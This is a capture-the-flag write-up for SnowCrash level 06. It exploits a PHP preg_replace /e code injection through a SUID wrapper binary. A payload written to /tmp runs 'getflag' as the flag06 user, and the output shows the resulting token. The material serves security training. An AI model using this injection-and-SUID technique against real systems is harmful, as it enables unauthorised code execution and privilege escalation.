# LEVEL 06

## Summary

This level demonstrates a PHP code injection vulnerability in the `level06.php` script, which can be exploited via a crafted input file. By leveraging the SUID binary `level06`, an attacker can execute arbitrary PHP code and retrieve the flag.

## Workflow

1. The directory `/home/user/level06` contains two files: **level06** (a binary program which execute the **level06.php** script with its first command-line argument) and **level06.php** (a PHP script). The PHP script is vulnerable to code injection because it doesn't sanitize properly its input (the content of the file passed as first argument).
	```
	level06@SnowCrash:~$ ls
	level06  level06.php
	```
	```
	level06@SnowCrash:~$ ./level06.php
	PHP Notice:  Undefined offset: 1 in /home/user/level06/level06.php on line 5
	PHP Notice:  Undefined offset: 2 in /home/user/level06/level06.php on line 5
	PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
	```
	```
	level06@SnowCrash:~$ cat level06.php
	#!/usr/bin/php
	<?php
	function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
	function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
	$r = x($argv[1], $argv[2]); print $r;
	?>
	```

2. After knowing that level06.php is vulnerable to code injection, we see that we can't run level06.php directly to execute getflag because we don't have the rights to. But passing by level06 makes us able to since it has the SUID bit set and is owned by flag06.
	```
	level06@SnowCrash:~$ ls -l
	total 12
	-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
	-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
	```
	```
	level06@SnowCrash:~$ getfacl level06.php level06
	# file: level06.php
	# owner: flag06
	# group: level06
	user::rwx
	group::r-x
	other::---

	# file: level06
	# owner: flag06
	# group: level06
	# flags: s--
	user::rwx
	group::---
	group:level06:r-x
	mask::r-x
	other::---
	```

3. We gotta put the injection in a file and pass this file as first argument to level06. /tmp is the perfect location to write our file since we have write permissions there.
	```
	level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/exploit
	```

4. Now we can run level06 with our file as argument and get the flag.
	```
	level06@SnowCrash:~$ ./level06 /tmp/exploit
	PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
	PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
	```